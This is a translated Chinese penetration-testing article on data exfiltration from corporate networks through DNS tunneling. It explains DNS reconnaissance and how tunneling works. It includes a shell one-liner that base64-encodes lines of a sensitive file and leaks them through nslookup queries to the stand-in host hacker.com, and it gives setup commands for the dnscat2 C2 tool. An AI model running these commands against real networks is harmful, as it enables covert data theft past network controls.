# 【技术分享】企业网络中的数据暗渡攻防策略

### 译文声明
本文为翻译文章，原文来源于安全客。译文仅供参考，具体内容及含义以原文为准。

**翻译：shan66**

**预估稿费：200RMB（欢迎投稿！）**

**投稿方式：**
- 发送邮件至 linwei#360.cn
- 或登录网页版在线投稿 [bobao.360.cn/contribute/index]

---

### 前言
数据暗渡，也称作数据挤出，是指在未经授权的情况下从计算机中转移数据。对于公司网络而言，此类攻击既可以通过手动方式（如使用U盘）实施，也可以通过自动方式进行（借助网络传输）。本文将重点探讨渗透测试过程中基于网络的数据暗渡技术及其相应的防御措施。

### 隧道技术
假设我们作为攻击者没有有效的域凭证，这意味着无法直接通过公司的代理服务器向外传输数据。此外，若无互联网连接，则也无法泄露敏感信息。在这种情况下，隧道技术显得尤为重要。

隧道技术不是直接在网络上传输数据包，而是通过封装技术在另一个（通常是加密的）连接中发送数据。这使得实际数据能够通过不同的协议进行网络传输，从而到达互联网。根据所使用的协议类型，隧道名称可能有所不同。接下来，我们将介绍几种常见的隧道技术。

### DNS隧道
在深入讨论DNS隧道之前，先了解一些基本但重要的知识。
```bash
➜  ~ cat /etc/resolv.conf|grep -v '#'
domain acme.local
nameserver 192.168.1.1
nameserver 192.168.1.2
```
首先，我们需要识别内部DNS服务器。以下是一些测试步骤：
1. 我们能否与内部DNS通信？
2. 我们能否通过公司DNS解析内部域名？
3. 我们可以通过内部DNS解析外部域名（例如：pentest.club）吗？
4. 我们可以直接与外部DNS通信吗？

```bash
➜  ~ nslookup acmebank.local
Server:    192.168.1.1
Address:  192.168.1.1#53
Name:  acmebank.local
Address: 192.168.10.12

➜  ~ nslookup google.com
Server:    192.168.1.1
Address:  192.168.1.1#53
Non-authoritative answer:
Name:  google.com
Address: 216.58.209.14

➜  ~ nslookup pentest.blog 8.8.8.8
Server: 8.8.8.8
Address: 8.8.8.8#53
Non-authoritative answer:
Name: pentest.blog
Address: 104.27.169.40
Name: pentest.blog
Address: 104.27.168.40
```

第一个命令的结果表明我们可以解析内部域名；第二个命令的结果表明我们可以通过公司DNS服务器解析外部域名。这意味着可以实现DNS隧道，但需要注意第三个命令。大多数安全网络不允许与外部DNS通信，如果允许，则存在安全问题，渗透测试人员需单独指出。

#### DNS隧道的工作原理
以下是详细的DNS隧道工作流程：
1. 渗透测试人员控制一个域名（如hacker.com），并向内部DNS服务器发送请求解析该域名。
2. hacker.com的权威DNS服务器位于互联网上，因此请求通过防火墙被重定向到根服务器。
3. 经多次重定向后，DNS请求最终到达渗透测试人员控制的hacker.com的权威DNS服务器。
4. 请求由渗透测试人员生成，响应内容并不重要。
5. 该响应返回到内部DNS服务器。
6. 最后，渗透测试人员收到该响应。

这一过程可用于与公司网络外部的服务器进行通信。假设我们获得了如下敏感数据：
```bash
➜  ~ cat sensitive.txt 
Alice
Bob
John
```

我们希望将这些机密数据通过网络泄露出去，尽管网络设置相对安全。以下是一个示例shell命令：
```bash
for i in $(cat sensitive.txt); do d=$(echo $i|base64) && nslookup $d.hacker.com; done
```

此命令逐行读取包含敏感信息的文件，对每行内容进行Base64编码，并在DNS查询期间将其用作子域名。一旦查询到达hacker.com的权威DNS服务器，我们可以通过捕获和解析DNS日志来获取子域名，从而得到敏感数据。然而，这种方法存在以下限制：
- 单向通信：无法从C2（权威DNS）发回命令。
- 大量数据处理困难：处理100MB数据时，DNS数据包可能会以不同顺序到达。

为解决这些问题，我们可以使用dnscat2工具。

### 如何配置和使用Dnscat2
Dnscat2提供了客户端和服务器应用程序。以下是构建DNS服务器所需的命令：
```bash
~ git clone https://github.com/iagox86/dnscat2.git
~ cd dnscat2/server/
~ gem install bundler
~ bundle install
```

在公司网络上安装客户端程序的命令如下：
```bash
root@pentest:~# git clone https://github.com/iagox86/dnscat2.git
root@pentest:~# cd dnscat2/client/
root@pentest:dnscat2/client/# make
```

一切准备就绪后，启动Dnscat2服务器：
```bash
root@khaleesi:/opt/dnscat2/server# ruby dnscat2.rb opendns.online
New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.
auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
```

通过以上步骤，我们可以利用Dnscat2工具有效地进行双向通信并处理大量数据。